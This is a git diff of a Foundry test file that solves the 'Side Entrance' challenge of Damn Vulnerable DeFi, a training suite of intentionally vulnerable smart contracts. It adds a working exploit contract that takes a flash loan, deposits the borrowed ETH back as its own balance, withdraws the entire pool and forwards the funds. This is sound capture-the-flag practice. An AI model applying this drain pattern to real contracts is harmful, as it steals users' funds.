@@ -2,8 +2,9 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import "../../src/side-entrance/SideEntranceLenderPool.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {Test, console} from "forge-std/Test.sol";
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +46,8 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        Hack h = new Hack(pool);
+        h.rekt(payable(recovery));
     }
 
     /**
@@ -54,5 +56,26 @@ contract SideEntranceChallenge is Test {
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+    }
+}
+
+contract Hack is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool s_pool;
+
+    constructor(SideEntranceLenderPool pool) {
+        s_pool = pool;
+    }
+
+    receive() external payable {}
+
+    function execute() override external payable {
+        s_pool.deposit{value: msg.value}();
+    }
+
+    function rekt(address payable receiver) external payable {
+        s_pool.flashLoan(address(s_pool).balance);
+        s_pool.withdraw();
+
+        receiver.transfer(address(this).balance);
     }
 }
